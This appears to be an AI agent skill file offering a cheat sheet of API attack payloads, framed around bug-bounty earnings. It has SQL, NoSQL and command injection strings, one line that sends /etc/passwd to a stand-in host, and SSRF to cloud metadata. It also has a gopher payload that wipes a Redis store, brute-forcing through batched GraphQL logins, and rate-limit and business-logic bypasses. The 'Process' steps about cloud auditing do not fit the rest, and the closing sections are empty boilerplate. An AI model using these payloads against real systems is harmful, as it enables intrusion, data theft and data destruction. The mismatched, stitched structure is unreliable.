---
name: api-destroyer
description: Aggressive API security testing for REST, GraphQL, gRPC, and WebSocket endpoints. Use when testing APIs for authorization
  flaws, injection, rate limiting bypass, or business logic abuse.
domain: cybersecurity
tags:
- api
- aws
- cybersecurity
- destroyer
- graphql
- rest-api
- security
- testing
---

# API Destroyer

APIs are the #1 attack surface in modern apps. Every endpoint is a potential entry point. This skill covers aggressive API testing beyond what scanners find.

## When to Use

- Testing REST/GraphQL/gRPC/WebSocket APIs
- Hunting IDOR/BOLA on API endpoints
- Bypassing API rate limiting and authentication
- Testing business logic via API manipulation
- API-first application security assessments

## The Process

1. **Inventory cloud assets** — enumerate services, roles, and configurations in scope
2. **Assess configurations** — check against security best practices and CIS benchmarks
3. **Test access controls** — verify IAM policies, network ACLs, and security group rules
4. **Validate logging** — ensure audit trails are enabled and properly retained
5. **Document and remediate** — report findings with specific configuration changes needed
### 1. API Discovery

Don't just test what you can see:

**Passive Discovery:**
- Swagger/OpenAPI docs (`/swagger.json`, `/openapi.json`, `/api-docs`)
- GraphQL introspection (`{__schema{types{name,fields{name}}}}`)
- JavaScript bundles (search for `fetch(`, `axios.`, `api/`)
- Mobile app decompilation (API endpoints in APK/IPA)
- Wayback Machine for deprecated endpoints
- GitHub/GitLab for hardcoded API URLs

**Active Discovery:**
- Wordlist brute force on `/api/`, `/v1/`, `/v2/`, `/internal/`
- Parameter fuzzing on known endpoints
- Method swapping (GET→POST, POST→PUT, DELETE→GET)
- Content-type manipulation (JSON→XML, form-data→JSON)
- Version enumeration (`/v1/`, `/v2/`, `/beta/`, `/internal/`)

### 2. Authorization Testing (The Money Maker)

#### IDOR/BOLA Systematic Testing

```
# Sequential IDs
GET /api/users/1 → yours
GET /api/users/2 → someone else's?

# UUID testing
GET /api/users/550e8400-e29b-41d4-a716-446655440000
# Try: increment, decrement, predict pattern

# Nested resources
GET /api/users/1/orders/1
GET /api/users/1/orders/2  # Different user's order?

# Array-based
GET /api/users?id[]=1&id[]=2&id[]=3
# Try adding other users' IDs

# JSON body manipulation
{"user_id": 1} → {"user_id": 2}
{"user_id": [1, 2]}  # Mass query

# Header-based
X-User-Id: 1 → X-User-Id: 2
X-Forwarded-For: 127.0.0.1  # Bypass IP restrictions
X-Original-URL: /admin  # Path confusion
```

#### Mass Assignment

```json
// Registration endpoint
POST /api/register
{"email": "test@test.com", "password": "123", "role": "admin"}

// Profile update
PUT /api/users/me
{"name": "test", "is_admin": true, "credits": 99999}

// Try hidden fields from API docs or JS source
{"name": "test", "internal_flag": true, "subscription": "premium"}
```

### 3. Injection Testing

#### SQL Injection in APIs

```json
// JSON parameter injection
{"username": "admin'--", "password": "x"}
{"username": "admin' OR '1'='1'--", "password": "x"}

// NoSQL injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Header injection
Authorization: Bearer ' OR '1'='1
X-Api-Key: admin'--
```

#### Command Injection

```
# URL parameters
/api/export?file=test;cat /etc/passwd
/api/export?file=test|whoami
/api/export?file=test$(whoami)

# JSON body
{"filename": "test;id"}
{"callback_url": "http://evil.com/$(cat /etc/passwd)"}
```

#### SSRF via API

```json
{"webhook_url": "http://169.254.169.254/latest/meta-data/"}
{"import_url": "file:///etc/passwd"}
{"fetch_url": "http://internal-service:8080/admin"}
{"redirect_url": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall"}
```

### 4. Rate Limit Bypass

```
# Header manipulation
X-Forwarded-For: 1.2.3.{1-255}
X-Real-IP: 10.0.0.{1-255}
X-Originating-IP: 172.16.0.{1-255}
X-Remote-IP: 192.168.1.{1-255}
X-Client-IP: 127.0.0.{1-255}
True-Client-IP: random

# IP rotation via headers (cycle through)
X-Forwarded-For: %s  # Generate random IPs

# Parameter pollution
POST /api/login
username=admin&password=wrong&username=admin

# Case manipulation
/api/Login vs /api/login vs /API/login

# Unicode normalization
/api/users%2f1 vs /api/users/1

# HTTP parameter contamination
/api/login?user=admin&user=admin  # Counted as 1 or 2?
```

### 5. GraphQL Specific Attacks

```graphql
# Introspection (map the entire schema)
{__schema{queryType{name},mutationType{name},types{name,fields{name,args{name,type{name,kind,ofType{name}}}}}}}

# Depth attack (DoS)
{user(id:1){friends{friends{friends{friends{friends{name}}}}}}}

# Batch query (bypass rate limit)
[
  {"query":"mutation{login(user:\"admin\",pass:\"pass1\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"pass2\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"pass3\"){token}}"}
]

# Alias-based batching
{
  a1: login(user:"admin",pass:"pass1"){token}
  a2: login(user:"admin",pass:"pass2"){token}
  a3: login(user:"admin",pass:"pass3"){token}
}

# Directive abuse
{user(id:1) @skip(if:false){email,password,ssn}}

# Field suggestion abuse
{user(id:1){email,resetToken,apiKey,internalNotes}}
```

### 6. WebSocket Attacks

```
# Connect and enumerate
wscat -c wss://target.com/ws

# Send malformed messages
{"type": "subscribe", "channel": "admin"}
{"type": "auth", "token": "stolen_token"}
{"type": "query", "user_id": 1}  # IDOR over WebSocket

# Cross-site WebSocket hijacking
# If Origin not validated, attacker site can connect
```

### 7. Business Logic Abuse

```
# Price manipulation
{"product_id": 1, "quantity": 1, "price": 0.01}
{"product_id": 1, "quantity": -1, "price": 100}  # Negative quantity

# Race conditions
# Send 100 concurrent requests to:
POST /api/transfer {"amount": 1000}
# If balance check isn't atomic, can overdraw

# Workflow bypass
# Skip steps: /step1 → /step3 (skip step2 verification)
# Replay completed steps with different data

# Integer overflow
{"quantity": 999999999999}
{"amount": -1}
```

## When NOT to Use

- Task is outside your authorization scope
- You need to implement controls (use implementing-* skills)
- Task is about analysis, not action (use analyzing-* skills)
- You don't have access to target systems
- Task requires compliance expertise (consult professionals)
- Task is about defense, not offense (use defensive skills)


## Red Flags

- Testing APIs without authorization
- Modifying real user data during testing
- Causing service disruption with DoS payloads
- Accessing real PII during testing
- Not cleaning up test accounts/data

## Verification

- All IDOR findings demonstrate cross-user data access
- Injection findings include working PoC with output
- Rate limit bypasses demonstrate actual bypass (not just header change)
- Business logic findings show financial impact
- All findings are non-destructive

## Revenue Potential

API bugs are everywhere and pay well:
- IDOR: $500-$10000 each (most common money maker)
- GraphQL introspection: $250-$1500
- Mass assignment: $500-$5000
- SSRF via API: $1000-$10000
- Business logic: $1000-$50000

## Overview

> Section content — see SKILL.md body for full details.

## Process

1. Analyze the task requirements
2. Apply domain expertise
3. Verify output quality
